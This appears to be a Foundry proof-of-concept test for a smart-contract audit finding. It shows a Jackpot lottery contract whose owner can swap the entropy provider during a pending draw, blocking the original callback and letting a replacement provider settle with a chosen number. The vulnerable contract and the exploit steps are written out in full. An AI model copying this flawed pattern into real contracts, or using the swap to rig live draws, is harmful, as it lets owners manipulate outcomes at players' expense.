// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IEntropyConsumer {
    function scaledEntropyCallback(uint256 requestId, uint256 randomNumber) external;
}

contract MockEntropyProvider {
    uint256 public nextRequestId = 1;

    function requestRandomness() external returns (uint256 requestId) {
        requestId = nextRequestId++;
    }

    function fulfill(address consumer, uint256 requestId, uint256 randomNumber) external {
        IEntropyConsumer(consumer).scaledEntropyCallback(requestId, randomNumber);
    }
}

contract Jackpot is IEntropyConsumer {
    address public owner;
    address public entropy;

    bool public drawingLocked;
    bool public settled;
    uint256 public activeRequestId;
    uint256 public winningNumber;

    event EntropySet(address indexed oldEntropy, address indexed newEntropy);
    event DrawingLocked(uint256 indexed requestId, address indexed entropyAtRequest);
    event Settled(uint256 indexed requestId, uint256 randomNumber, address indexed entropyCaller);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier onlyEntropy() {
        require(msg.sender == entropy, "only entropy");
        _;
    }

    constructor(address _entropy) {
        owner = msg.sender;
        entropy = _entropy;
    }

    function setEntropy(address newEntropy) external onlyOwner {
        emit EntropySet(entropy, newEntropy);
        entropy = newEntropy;
    }

    function startDrawing() external onlyOwner returns (uint256 requestId) {
        require(!drawingLocked, "already locked");
        require(!settled, "already settled");

        drawingLocked = true;
        requestId = MockEntropyProvider(entropy).requestRandomness();
        activeRequestId = requestId;

        emit DrawingLocked(requestId, entropy);
    }

    function scaledEntropyCallback(uint256 requestId, uint256 randomNumber) external onlyEntropy {
        require(drawingLocked, "no active drawing");
        require(requestId == activeRequestId, "bad request");

        winningNumber = randomNumber;
        settled = true;
        drawingLocked = false;

        emit Settled(requestId, randomNumber, msg.sender);
    }
}

contract ExploitTest is Test {
    Jackpot jackpot;
    MockEntropyProvider originalEntropy;
    MockEntropyProvider replacementEntropy;

    address owner = address(0xA11CE);

    function setUp() public {
        // Deploy the original and replacement entropy providers
        originalEntropy = new MockEntropyProvider();
        replacementEntropy = new MockEntropyProvider();

        // Deploy Jackpot with the original entropy provider
        vm.prank(owner);
        jackpot = new Jackpot(address(originalEntropy));
    }

    function test_exploit() public {
        // Step 1: Owner starts a drawing using the original entropy provider.
        vm.prank(owner);
        uint256 requestId = jackpot.startDrawing();

        // Sanity check: drawing is now locked and awaiting callback from original provider.
        assertTrue(jackpot.drawingLocked());
        assertEq(jackpot.activeRequestId(), requestId);
        assertEq(jackpot.entropy(), address(originalEntropy));

        // Step 2: Before the original provider fulfills, owner swaps entropy mid-operation.
        vm.prank(owner);
        jackpot.setEntropy(address(replacementEntropy));

        // Assert the trusted entropy source changed while the same draw is still in flight.
        assertTrue(jackpot.drawingLocked());
        assertEq(jackpot.activeRequestId(), requestId);
        assertEq(jackpot.entropy(), address(replacementEntropy));

        // Step 3: The original provider attempts to fulfill the request it created.
        // This now fails because scaledEntropyCallback authorizes only the CURRENT entropy address.
        vm.expectRevert(bytes("only entropy"));
        originalEntropy.fulfill(address(jackpot), requestId, 111);

        // Assert harmful outcome #1: the original callback path is broken and the draw remains frozen.
        assertTrue(jackpot.drawingLocked());
        assertFalse(jackpot.settled());
        assertEq(jackpot.winningNumber(), 0);

        // Step 4: The replacement provider, which did NOT create the original request, can now settle it.
        replacementEntropy.fulfill(address(jackpot), requestId, 777);

        // Assert harmful outcome #2: settlement occurred under a different entropy source than the one
        // used when randomness was requested.
        assertFalse(jackpot.drawingLocked());
        assertTrue(jackpot.settled());
        assertEq(jackpot.winningNumber(), 777);
        assertEq(jackpot.entropy(), address(replacementEntropy));
    }
}